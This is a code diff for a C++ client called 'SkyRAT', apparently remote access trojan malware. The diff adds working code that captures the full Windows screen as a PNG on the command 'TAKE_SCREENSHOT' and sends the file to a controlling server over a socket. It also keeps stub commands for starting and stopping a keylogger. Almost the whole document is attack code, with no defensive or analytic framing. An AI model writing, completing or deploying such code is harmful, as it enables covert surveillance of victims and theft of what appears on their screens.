@@ -8,9 +8,14 @@
 #include <string>
 #include <atomic>
 #include <csignal>
+#include <fstream>
+
 #ifdef _WIN32
 #include <winsock2.h>
+#include <windows.h>
+#include <gdiplus.h>
 #pragma comment(lib, "ws2_32.lib")
+#pragma comment(lib, "Gdiplus.lib")
 #else
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -21,21 +26,93 @@
 typedef int SOCKET;
 #endif
 
-// Configuration
-const char* SERVER_IP   = "127.0.0.1";  // Update with server IP
-const uint16_t SERVER_PORT = 4545;       // Update with server port
-const int    RECV_BUF_SIZE = 1024;
+using namespace Gdiplus;
 
-// Global flag for graceful shutdown
+// Configuration of server connection
+const char* SERVER_IP     = "127.0.0.1"; // Server IP address
+const uint16_t SERVER_PORT = 4545;        // Server port
+const int    RECV_BUF_SIZE = 1024;        // Buffer size for receiving data
+
+// Global atomic flag for graceful shutdown
 std::atomic<bool> g_running{true};
 
-// Signal handler for Ctrl+C
+// Signal handler to catch termination signals (like Ctrl+C)
 void signal_handler(int signal) {
     std::cout << "\n[Signal] Received signal " << signal << ". Shutting down gracefully..." << std::endl;
-    g_running = false;
+    g_running = false; // Set the flag to false to stop main loop
 }
 
-// Initialize networking on Windows
+// GDI+: Convert std::string to std::wstring
+std::wstring StringAtoW(const std::string& str) {
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
+    std::wstring wstrTo(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
+    return wstrTo;
+}
+
+// Function to take a screenshot and save it as a PNG file
+void TakeScreenshot(const char* filename) {
+    int width = GetSystemMetrics(SM_CXSCREEN); // Get screen width
+    int height = GetSystemMetrics(SM_CYSCREEN); // Get screen height
+
+    // Get device context of the full screen
+    HDC hScreenDC = GetDC(NULL);
+    // Create a compatible device context in memory
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
+    // Create a bitmap compatible with the screen
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
+    // Select the bitmap into the device context
+    HGDIOBJ hOldBitmap = SelectObject(hMemoryDC, hBitmap);
+
+    // Copy screen into bitmap
+    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
+    // Wrap the HBITMAP into a GDI+ Bitmap object
+    Bitmap bmp(hBitmap, NULL);
+
+    // CLSID for PNG encoder
+    CLSID pngClsid;
+    CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &pngClsid);
+    // Save bitmap as PNG
+    bmp.Save(StringAtoW(filename).c_str(), &pngClsid, NULL);
+
+    // Cleanup GDI objects
+    SelectObject(hMemoryDC, hOldBitmap);
+    DeleteObject(hBitmap);
+    DeleteDC(hMemoryDC);
+    ReleaseDC(NULL, hScreenDC);
+}
+
+// Function to send a file over socket
+bool SendFile(SOCKET sock, const char* filename) {
+    // Open file in binary mode
+    std::ifstream file(filename, std::ios::binary);
+    if (!file.is_open()) {
+        std::cerr << "Failed to open file: " << filename << std::endl;
+        return false;
+    }
+
+    // Get file size
+    file.seekg(0, std::ios::end);
+    size_t filesize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    // Send the size of the file first
+    send(sock, (char*)&filesize, sizeof(filesize), 0);
+
+    // Send file contents in chunks
+    char buffer[1024];
+    while (!file.eof()) {
+        file.read(buffer, sizeof(buffer));
+        std::streamsize bytesRead = file.gcount();
+        send(sock, buffer, bytesRead, 0);
+    }
+
+    // Close the file
+    file.close();
+    return true;
+}
+
+// Initialize socket subsystem
 bool init_sockets() {
 #ifdef _WIN32
     WSADATA wsaData;
@@ -45,14 +122,14 @@ bool init_sockets() {
 #endif
 }
 
-// Cleanup networking on Windows
+// Cleanup socket subsystem
 void cleanup_sockets() {
 #ifdef _WIN32
     WSACleanup();
 #endif
 }
 
-// Create and return a connected socket, or INVALID_SOCKET on error
+// Create and connect socket to server
 SOCKET connect_to_server(const char* ip, uint16_t port) {
     SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock == INVALID_SOCKET) {
@@ -65,6 +142,7 @@ SOCKET connect_to_server(const char* ip, uint16_t port) {
     serverAddr.sin_port   = htons(port);
     serverAddr.sin_addr.s_addr = inet_addr(ip);
 
+    // Connect to server
     if (connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         std::cerr << "Error: Connection failed." << std::endl;
 #ifdef _WIN32
@@ -75,44 +153,54 @@ SOCKET connect_to_server(const char* ip, uint16_t port) {
         return INVALID_SOCKET;
     }
 
-    return sock;
+    return sock; // Return connected socket
 }
 
-// Send a null-terminated C-string message
+// Send message over socket
 bool send_message(SOCKET sock, const char* msg) {
     size_t len = std::strlen(msg);
     return send(sock, msg, static_cast<int>(len), 0) != SOCKET_ERROR;
 }
 
-// Receive into buffer, returns bytes received or -1 on error
+// Receive message from socket
 int receive_reply(SOCKET sock, char* buffer, int bufSize) {
     int bytes = recv(sock, buffer, bufSize - 1, 0);
-    if (bytes > 0) buffer[bytes] = '\0';
+    if (bytes > 0) buffer[bytes] = '\0'; // Null-terminate the received data
     return bytes;
 }
 
-// Handle different commands from server
-void handle_command(const std::string& command) {
+// Handle commands received from server
+void handle_command(const std::string& command, SOCKET sock) {
     std::cout << "[Command] Received: " << command << std::endl;
-    
-    if (command == "START_KEYLOGGER") {
-        std::cout << "[Action] Starting keylogger module..." << std::endl;
-        // TODO: Implement keylogger functionality
-    }
-    else if (command == "TAKE_SCREENSHOT") {
+
+    if (command == "TAKE_SCREENSHOT") {
         std::cout << "[Action] Taking screenshot..." << std::endl;
-        // TODO: Implement screenshot functionality
+
+        // Initialize GDI+
+        ULONG_PTR gdiplusToken;
+        GdiplusStartupInput gdiStartupInput;
+        GdiplusStartup(&gdiplusToken, &gdiStartupInput, NULL);
+
+        const char* filename = "screenshot.png"; // Save filename
+        TakeScreenshot(filename); // Capture screenshot
+        SendFile(sock, filename); // Send the screenshot file
+
+        GdiplusShutdown(gdiplusToken); // Shutdown GDI+
+    }
+    else if (command == "START_KEYLOGGER") {
+        std::cout << "[Action] Starting keylogger module..." << std::endl;
+        // TODO: Implement keylogger start
     }
     else if (command == "STOP_KEYLOGGER") {
         std::cout << "[Action] Stopping keylogger..." << std::endl;
-        // TODO: Stop keylogger
+        // TODO: Implement keylogger stop
     }
     else {
         std::cout << "[Action] Unknown command, echoing back: " << command << std::endl;
     }
 }
 
-// Thread worker: handles one connection lifecycle
+// Connection handler in a separate thread
 void handle_connection() {
     if (!init_sockets()) {
         std::cerr << "Error: Socket subsystem init failed." << std::endl;
@@ -126,7 +214,7 @@ void handle_connection() {
     }
     std::cout << "[Thread] Connected to server on " << SERVER_IP << ":" << SERVER_PORT << std::endl;
 
-    // Send initial greeting
+    // Send initial greeting message
     const char* greeting = "Hello from threaded client!";
     if (!send_message(sock, greeting)) {
         std::cerr << "Error: Send failed." << std::endl;
@@ -134,15 +222,15 @@ void handle_connection() {
     }
     std::cout << "[Thread] Sent greeting to server" << std::endl;
 
-    // Keep listening for server commands
+    // Listening for server commands
     char buffer[RECV_BUF_SIZE];
     while (g_running) {
         int received = receive_reply(sock, buffer, RECV_BUF_SIZE);
         if (received > 0) {
             std::string command(buffer);
-            handle_command(command);
-            
-            // Send acknowledgment back to server
+            handle_command(command, sock);
+
+            // Send acknowledgment back
             std::string ack = "ACK: " + command;
             if (!send_message(sock, ack.c_str())) {
                 std::cerr << "Error: Failed to send acknowledgment." << std::endl;
@@ -163,22 +251,22 @@ cleanup:
 #else
     close(sock);
 #endif
-
     cleanup_sockets();
     std::cout << "[Thread] Connection closed." << std::endl;
 }
 
 int main() {
     std::cout << "Starting SkyRAT threaded client..." << std::endl;
-    
-    // Set up signal handler for graceful shutdown
+
+    // Register signal handler
     std::signal(SIGINT, signal_handler);
-    
-    // Spawn connection thread
+
+    // Launch thread for handling connection
     std::thread clientThread(handle_connection);
 
-    // Wait for client thread to finish
+    // Wait for thread to finish
     clientThread.join();
+
     std::cout << "Client thread finished. Exiting." << std::endl;
     return 0;
 }
